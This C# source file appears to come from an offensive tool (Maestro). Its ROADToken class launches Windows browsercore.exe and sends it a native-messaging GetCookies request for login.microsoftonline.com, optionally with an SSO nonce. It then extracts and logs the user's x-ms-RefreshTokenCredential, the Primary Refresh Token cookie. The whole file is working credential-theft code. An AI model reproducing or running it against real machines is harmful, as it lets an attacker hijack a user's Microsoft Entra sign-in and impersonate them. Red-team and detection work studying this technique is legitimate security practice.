using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;

namespace Maestro
{
    class ROADToken
    {
        public static string GetXMsRefreshtokencredential(string nonce = null)
        {
            string xMsRefreshtokencredential = null;

            string[] filelocs = {
                @"C:\Program Files\Windows Security\BrowserCore\browsercore.exe",
                @"C:\Windows\BrowserCore\browsercore.exe"
            };
            string targetFile = null;
            foreach (string file in filelocs)
            {

                if (File.Exists(file))
                {
                    targetFile = file;
                    break;
                }
            }
            if (targetFile == null)
            {
                Logger.Error("Could not find browsercore.exe in one of the predefined locations");
                return null;
            }
            using (Process myProcess = new Process())
            {
                myProcess.StartInfo.FileName = targetFile;
                myProcess.StartInfo.UseShellExecute = false;
                myProcess.StartInfo.RedirectStandardInput = true;
                myProcess.StartInfo.RedirectStandardOutput = true;
                string stuff;
                if (!string.IsNullOrEmpty(nonce))
                {
                    Logger.Info($"Using supplied nonce: {nonce}");
                    stuff = "{" +
                    "\"method\":\"GetCookies\"," +
                    $"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}\"," +
                    "\"sender\":\"https://login.microsoftonline.com\"" +
                    "}";
                }
                else
                {
                    Logger.Warning("No nonce supplied, refresh cookie will likely not work!");
                    stuff = "{" +
                        "\"method\":\"GetCookies\"," +
                        $"\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\"," +
                        "\"sender\":\"https://login.microsoftonline.com\"" +
                    "}";
                }

                myProcess.Start();

                StreamWriter myStreamWriter = myProcess.StandardInput;
                var myInt = stuff.Length;
                // Write length of stream
                byte[] bytes = BitConverter.GetBytes(myInt);
                myStreamWriter.BaseStream.Write(bytes, 0, 4);
                // Write data
                myStreamWriter.Write(stuff);

                // Close stream
                myStreamWriter.Close();
                // Read output
                
                string processOutput = null;
                while (!myProcess.StandardOutput.EndOfStream)
                {
                    string line = myProcess.StandardOutput.ReadLine();
                    processOutput += line;
                    Console.WriteLine(line);
                }
                // Wait for exit
                myProcess.WaitForExit();
                Console.WriteLine(myProcess.ExitCode);

                string pattern = "\"name\":\"x-ms-RefreshTokenCredential\",\"data\":\"(eyJh[^\"]+)";
                Match match = Regex.Match(processOutput, pattern);

                if (!match.Success)
                {
                    return null;
                }
                xMsRefreshtokencredential = match.Groups[1].Value;
                Logger.Info($"Successfully obtained x-Ms-Refreshtokencredential: {xMsRefreshtokencredential}");
                return xMsRefreshtokencredential;
            }
        }
    }
}